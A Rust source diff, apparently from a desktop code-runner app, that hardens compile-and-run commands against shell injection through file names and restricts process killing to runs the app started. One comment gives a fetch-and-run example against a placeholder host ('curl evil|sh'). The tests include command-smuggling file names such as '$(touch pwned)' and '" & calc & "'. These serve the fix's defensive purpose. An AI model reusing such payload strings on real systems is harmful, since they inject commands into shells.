@@ -169,10 +169,9 @@ fn build_run_command(language: &str, file_path: &str, user_args: &[String], wsl:
             let mut run_args = vec![stem.to_string()];
             run_args.extend_from_slice(user_args);
             // Use a shell wrapper: javac <file> && java -cp <dir> <class> [args]
-            let joined_user = shell_quote_args(user_args);
-            let shell_cmd = format!(
-                "javac \"{file_path}\" && java -cp \"{parent}\" {stem} {joined_user}"
-            );
+            let q = |a: &str| shell_arg(a, windows);
+            let joined_user = shell_quote_args(user_args, windows)?;
+            let shell_cmd = format!("javac {} && java -cp {} {} {joined_user}", q(file_path)?, q(&parent)?, q(stem)?);
             if windows {
                 RunCommand {
                     program: "cmd".to_string(),
@@ -193,10 +192,9 @@ fn build_run_command(language: &str, file_path: &str, user_args: &[String], wsl:
             } else {
                 format!("{}.out", file_path)
             };
-            let joined_user = shell_quote_args(user_args);
-            let shell_cmd = format!(
-                "{compiler} -o \"{out_bin}\" \"{file_path}\" && \"{out_bin}\" {joined_user}"
-            );
+            let q = |a: &str| shell_arg(a, windows);
+            let joined_user = shell_quote_args(user_args, windows)?;
+            let shell_cmd = format!("{compiler} -o {bin} {} && {bin} {joined_user}", q(file_path)?, bin = q(&out_bin)?);
             if windows {
                 RunCommand {
                     program: "cmd".to_string(),
@@ -235,7 +233,7 @@ fn build_run_command(language: &str, file_path: &str, user_args: &[String], wsl:
             RunCommand { program: "perl".to_string(), args }
         }
         "r" => {
-            let mut args = vec!["--no-save".to_string(), "--no-restore".to_string(), "<".to_string(), file_str];
+            let mut args = vec!["--no-save".to_string(), "--no-restore".to_string(), file_str];
             args.extend_from_slice(user_args);
             RunCommand { program: "Rscript".to_string(), args }
         }
@@ -254,10 +252,9 @@ fn build_run_command(language: &str, file_path: &str, user_args: &[String], wsl:
                 .map(|p| p.to_string_lossy().to_string())
                 .unwrap_or_default();
             let jar_path = format!("{}/{}.jar", parent, stem);
-            let joined_user = shell_quote_args(user_args);
-            let shell_cmd = format!(
-                "kotlinc \"{file_path}\" -include-runtime -d \"{jar_path}\" && java -jar \"{jar_path}\" {joined_user}"
-            );
+            let q = |a: &str| shell_arg(a, windows);
+            let joined_user = shell_quote_args(user_args, windows)?;
+            let shell_cmd = format!("kotlinc {} -include-runtime -d {jar} && java -jar {jar} {joined_user}", q(file_path)?, jar = q(&jar_path)?);
             if windows {
                 RunCommand {
                     program: "cmd".to_string(),
@@ -305,6 +302,8 @@ fn kernel_script() -> Result<String, String> {
 lazy_static::lazy_static! {
     /// stdin of `kernel` runs, by pid: the notebook sends its commands there.
     static ref KERNEL_STDIN: Mutex<HashMap<u32, std::process::ChildStdin>> = Mutex::new(HashMap::new());
+    /// Runs (and notebook kernels) started by run_file and still running.
+    static ref RUN_PIDS: Mutex<std::collections::HashSet<u32>> = Mutex::new(std::collections::HashSet::new());
 }
 
 /// Send one line to a running notebook kernel (see assets/fahh_kernel.py for the commands).
@@ -516,11 +515,22 @@ fn wsl_script(run_cmd: &RunCommand) -> String {
         .join(" ")
 }
 
-fn shell_quote_args(args: &[String]) -> String {
-    args.iter()
-        .map(|a| format!("\"{}\"", a.replace('"', "\\\"")))
-        .collect::<Vec<_>>()
-        .join(" ")
+/// One argument for the `sh -c` / `cmd /C` line of a compile-and-run. File names come from
+/// the repository, so they must never be read as shell syntax: `x$(curl evil|sh).c` used to
+/// run its payload. sh: single quotes. cmd: double quotes, and the characters cmd still
+/// expands inside them (`%`, `"`, newlines) are refused.
+fn shell_arg(a: &str, windows: bool) -> Result<String, String> {
+    if !windows {
+        return Ok(crate::core::wsl::sh_quote(a));
+    }
+    if a.contains(['"', '%', '\n', '\r']) {
+        return Err(format!("Cannot run this through cmd safely: {a:?} contains \", % or a line break. Rename it, or run it from the terminal."));
+    }
+    Ok(format!("\"{a}\""))
+}
+
+fn shell_quote_args(args: &[String], windows: bool) -> Result<String, String> {
+    Ok(args.iter().map(|a| shell_arg(a, windows)).collect::<Result<Vec<_>, _>>()?.join(" "))
 }
 
 /// State holding PIDs of currently-running child processes so they can be killed.
@@ -583,6 +593,9 @@ pub async fn run_file(app: AppHandle, config: RunConfig) -> Result<RunResult, St
         }
     };
 
+    // Its own process group on Unix, so Stop ends the whole run (sh -c "cc && ./a.out", npx tsx).
+    #[cfg(unix)]
+    std::os::unix::process::CommandExt::process_group(&mut command, 0);
     let mut child = command
         .stdin(if language == "kernel" { Stdio::piped() } else { Stdio::inherit() })
         .stdout(Stdio::piped())
@@ -591,6 +604,9 @@ pub async fn run_file(app: AppHandle, config: RunConfig) -> Result<RunResult, St
         .map_err(|e| format!("Failed to spawn process `{program}`: {e}"))?;
 
     let pid = child.id();
+    if let Ok(mut runs) = RUN_PIDS.lock() {
+        runs.insert(pid);
+    }
     if let Some(stdin) = child.stdin.take() {
         KERNEL_STDIN.lock().map_err(|e| e.to_string())?.insert(pid, stdin);
     }
@@ -663,9 +679,17 @@ pub async fn run_file(app: AppHandle, config: RunConfig) -> Result<RunResult, St
             map.remove(&pid);
         }
         
-        let status = child.wait().expect("Failed to wait on child");
+        let exit_code = match child.wait() {
+            Ok(status) => status.code().unwrap_or(-1),
+            Err(e) => {
+                warn!("run_file: waiting for PID={pid} failed: {e}");
+                -1
+            }
+        };
+        if let Ok(mut runs) = RUN_PIDS.lock() {
+            runs.remove(&pid);
+        }
         let duration_ms = start.elapsed().as_millis() as u64;
-        let exit_code = status.code().unwrap_or(-1);
 
         info!("run_file: PID={pid} exited with code={exit_code}, duration={duration_ms}ms");
 
@@ -691,8 +715,21 @@ pub async fn run_file(app: AppHandle, config: RunConfig) -> Result<RunResult, St
 /// Kill a running process by its PID.
 #[tauri::command]
 pub fn stop_run(pid: u32) -> Result<(), String> {
+    // Only a run this app started and that is still running: the webview must not be able to
+    // kill any process (and a recycled pid must not take an unrelated process tree with it).
+    if !RUN_PIDS.lock().map_err(|e| e.to_string())?.contains(&pid) {
+        return Err(format!("No run with process id {pid} is running."));
+    }
     info!("stop_run: killing PID={pid}");
     kill_pid(pid)
+}
+
+/// Every process tree that should die with the app: called on exit.
+pub fn stop_all_runs() {
+    let pids: Vec<u32> = RUN_PIDS.lock().map(|r| r.iter().copied().collect()).unwrap_or_default();
+    for pid in pids {
+        let _ = kill_pid(pid);
+    }
 }
 
 /// Platform-specific process termination.
@@ -710,8 +747,8 @@ fn kill_pid(pid: u32) -> Result<(), String> {
     }
     #[cfg(not(target_os = "windows"))]
     {
-        // SIGTERM first; if the process doesn't heed it the user can call again.
-        let result = unsafe { libc::kill(pid as libc::pid_t, libc::SIGTERM) };
+        // SIGTERM to the run's process group (see run_file); if it doesn't heed it the user can call again.
+        let result = unsafe { libc::kill(-(pid as libc::pid_t), libc::SIGTERM) };
         if result != 0 {
             return Err(format!("kill({pid}, SIGTERM) failed: errno={}", std::io::Error::last_os_error()));
         }
@@ -721,6 +758,22 @@ fn kill_pid(pid: u32) -> Result<(), String> {
 
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn stop_run_refuses_pids_it_did_not_start() {
+        assert!(super::stop_run(std::process::id()).is_err());
+    }
+
+    #[test]
+    fn compile_and_run_never_lets_a_file_name_reach_the_shell() {
+        let evil = "/tmp/x$(touch pwned)`id`.c";
+        assert_eq!(super::shell_arg(evil, false).unwrap(), "'/tmp/x$(touch pwned)`id`.c'");
+        assert_eq!(super::shell_arg("it's.c", false).unwrap(), r"'it'\''s.c'");
+        assert!(super::shell_arg(r"C:\p\%PATH%.c", true).is_err());
+        assert!(super::shell_arg("a\" & calc & \".c", true).is_err());
+        assert_eq!(super::shell_arg(r"C:\my files\a&b.c", true).unwrap(), r#""C:\my files\a&b.c""#);
+        assert_eq!(super::shell_quote_args(&["a b".into(), "$HOME".into()], false).unwrap(), "'a b' '$HOME'");
+    }
+
     use super::*;
 
     #[test]
